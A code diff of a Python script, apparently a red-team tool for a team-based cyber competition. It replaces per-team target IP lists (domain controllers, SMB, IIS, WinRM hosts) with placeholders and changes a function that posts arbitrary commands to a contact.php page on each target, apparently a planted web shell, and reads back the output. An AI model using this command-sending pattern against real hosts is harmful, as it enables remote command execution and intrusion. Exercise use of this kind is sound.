@@ -17,59 +17,30 @@ from InquirerPy.base.control import Choice
 from InquirerPy.utils import get_style
 
 ALL_HOSTS = [
-    # Team 1
-    "192.168.1.3", "192.168.1.4", "10.1.1.1", "10.1.1.2", "10.1.1.3",
-    
-    # Team 2
-    "192.168.2.3", "192.168.2.4", "10.2.1.1", "10.2.1.2", "10.2.1.3",
-    
-    # Team 3
-    "192.168.3.3", "192.168.3.4", "10.3.1.1", "10.3.1.2", "10.3.1.3",
-    
-    # Team 4
-    "192.168.4.3", "192.168.4.4", "10.4.1.1", "10.4.1.2", "10.4.1.3",
-    
-    # Team 5
-    "192.168.5.3", "192.168.5.4", "10.5.1.1", "10.5.1.2", "10.5.1.3",
-    
-    # Team 6
-    "192.168.6.3", "192.168.6.4", "10.6.1.1", "10.6.1.2", "10.6.1.3",
-    
-    # Team 7
-    "192.168.7.3", "192.168.7.4", "10.7.1.1", "10.7.1.2", "10.7.1.3",
-    
-    # Team 8
-    "192.168.8.3", "192.168.8.4", "10.8.1.1", "10.8.1.2", "10.8.1.3",
+    # List Teams Here
+
+    # Custom IPs
+    "192.168.1.6",
 ]
 
 ALL_DC = [
-    # Domain Controllers - typically the .1 addresses in 10.X.1. subnet
-    "10.1.1.1", "10.2.1.1", "10.3.1.1", "10.4.1.1", "10.5.1.1",
-    "10.6.1.1", "10.7.1.1", "10.8.1.1",
+    # Domain Controllers - typically the ??? addresses
 ]
 
 ALL_SMB = [
-    # SMB Hosts - typically the 192.168.X.3 addresses
-    "192.168.1.3", "192.168.2.3", "192.168.3.3", "192.168.4.3", "192.168.5.3",
-    "192.168.6.3", "192.168.7.3", "192.168.8.3",
+    # SMB Hosts - typically the ??? addresses
 ]
 
 ALL_IIS = [
-    # IIS Hosts - typically the 192.168.X.4 addresses
-    "192.168.1.4", "192.168.2.4", "192.168.3.4", "192.168.4.4", "192.168.5.4",
-    "192.168.6.4", "192.168.7.4", "192.168.8.4",
+    # IIS Hosts - typically the ??? addresses
 ]
 
 ALL_WINRM = [
-    # WinRM Hosts - typically the 10.X.1.2 addresses
-    "10.1.1.2", "10.2.1.2", "10.3.1.2", "10.4.1.2", "10.5.1.2",
-    "10.6.1.2", "10.7.1.2", "10.8.1.2",
+    # WinRM Hosts - typically the ??? addresses
 ]
 
 ALL_ICMP = [
-    # ICMP Hosts - typically the 10.X.1.3 addresses
-    "10.1.1.3", "10.2.1.3", "10.3.1.3", "10.4.1.3", "10.5.1.3",
-    "10.6.1.3", "10.7.1.3", "10.8.1.3",
+    # ICMP Hosts - typically the ??? addresses
 ]
 
 PORT = 8080
@@ -222,12 +193,13 @@ def select_local_ip():
 def send_command(client, port, command):
     url = f"http://{client}:{port}/contact.php"
     
-    # Send as form data
+    # Send as JSON data
+    headers = {"Content-Type": "application/json"}
     data = {"input_word": command}
-    
+
     try:
         # Using form data approach
-        r = requests.post(url, data=data, timeout=TIMEOUT)
+        r = requests.post(url, json=data, headers=headers, timeout=TIMEOUT)
         clean_text = r.text.replace('<pre>', '').replace('</pre>', '')
         return (client, r.status_code, clean_text)
     except Exception as e:
